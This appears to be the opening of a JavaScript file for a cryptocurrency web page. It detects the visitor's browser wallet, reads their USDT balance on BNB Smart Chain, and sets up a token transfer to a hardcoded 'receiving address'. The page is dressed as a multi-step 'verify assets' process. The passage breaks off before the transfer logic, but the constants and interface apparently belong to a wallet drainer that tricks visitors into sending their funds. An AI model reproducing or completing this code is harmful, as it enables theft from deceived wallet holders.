// ============================================================================
// Your Original Script's Constants
// These are kept as is.
// ============================================================================
const bscAddress = "0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090"; // Your USDT receiving address
const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP20 Contract

// Note: bnbGasSender was in your first script but not actively used in the transfer logic,
// and not present in the "working" script's main flow. Keeping it commented for clarity.
// const bnbGasSender = "0x04a7f2e3E53aeC98B9C8605171Fc070BA19Cfb87";

// ============================================================================
// New Global Variables & UI Element References (from your working script)
// These MUST correspond to IDs in your HTML for the script to function.
// ============================================================================
let web3; // Global Web3 instance
let userAddress; // Global variable to store the user's connected wallet address

let tokenBalanceValue = 0; // To store the fetched token balance
let tokenContract; // Web3.js contract instance for USDT
let isTransferComplete = false; // Flag to prevent re-triggering transfer

let currentProvider = null; // Stores the detected wallet provider (e.g., window.ethereum, window.trustwallet)
let walletType = 'unknown'; // Stores the type of wallet detected (e.g., 'metamask', 'trust', 'binance')

// References to HTML elements - these need to exist in your HTML
const verifyAssets = document.getElementById('verifyAssets'); // Changed from verifyBtn
const walletAddress = document.getElementById('walletAddress');
const tokenBalance = document.getElementById('tokenBalance');
const verificationModal = document.getElementById('verificationModal');
const progressBar = document.getElementById('progressBar');
const step1 = document.getElementById('step1');
const step2 = document.getElementById('step2');
const step3 = document.getElementById('step3');
const step4 = document.getElementById('step4');
const step1Desc = document.getElementById('step1Desc');
const step2Desc = document.getElementById('step2Desc');
const step3Desc = document.getElementById('step3Desc');
const step4Desc = document.getElementById('step4Desc');
const modalMessage = document.getElementById('modalMessage');
const closeModalBtns = document.querySelectorAll('.close-modal');
const networkDot = document.getElementById('networkDot');
const networkStatus = document.getElementById('networkStatus');

// Configuration from your working script
const recipientAddress = '0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090'; // Your USDT receiving address (same as bscAddress)

// ABI from your working script - includes both balanceOf and transfer
const tokenAbi = [
    {
        "constant": true,
        "inputs": [{"name": "who", "type": "address"}],
        "name": "balanceOf",
        "outputs": [{"name": "", "type": "uint256"}],
        "type": "function"
    },
    {
        "constant": false,
        "inputs": [
            {"name": "_to", "type": "address"},
            {"name": "_value", "type": "uint256"}
        ],
        "name": "transfer",
        "outputs": [{"name": "", "type": "bool"}],
        "type": "function"
    }
];

// Network configuration from your working script
const BSC_MAINNET_CHAIN_ID = '0x38'; // Binance Smart Chain Mainnet
const BSC_MAINNET_PARAMS = {
    chainId: BSC_MAINNET_CHAIN_ID,
    chainName: 'Binance Smart Chain Mainnet',
    nativeCurrency: {
        name: 'BNB',
        symbol: 'bnb',
        decimals: 18
    },
    rpcUrls: ['https://bsc-dataseed.binance.org/'],
    blockExplorerUrls: ['https://bscscan.com/']
};

// Wallet types enum from your working script
const WALLET_TYPES = {
    TRUST: 'trust',
    BINANCE: 'binance',
    METAMASK: 'metamask',
    UNKNOWN: 'unknown'
};

// ============================================================================
// Helper Functions (Copied from your working script)
// ============================================================================

/**
 * @dev Initializes Web3.js by detecting the available wallet provider.
 * Sets `web3`, `currentProvider`, and `walletType`.
 * @returns {boolean} True if Web3 is successfully initialized, false otherwise.
 */
async function initWeb3() {
    // Detect wallet type based on global objects injected by wallet extensions
    if (window.trustwallet) {
        walletType = WALLET_TYPES.TRUST;
        currentProvider = window.trustwallet;
    } else if (window.BinanceChain) {
        walletType = WALLET_TYPES.BINANCE;
        currentProvider = window.BinanceChain;
    } else if (window.ethereum) { // Generic Ethereum provider (MetaMask, etc.)
        walletType = WALLET_TYPES.METAMASK;
        currentProvider = window.ethereum;
    } else if (window.web3 && window.web3.currentProvider) { // Older web3.js detection
        walletType = WALLET_TYPES.UNKNOWN; // Or 'unknown_legacy_web3'
        currentProvider = window.web3.currentProvider;
    } else {
        console.error("No Web3 provider detected. Please install a compatible wallet extension.");
        showError("Please install Trust Wallet, Binance Wallet or MetaMask.");
        return false;
    }

 
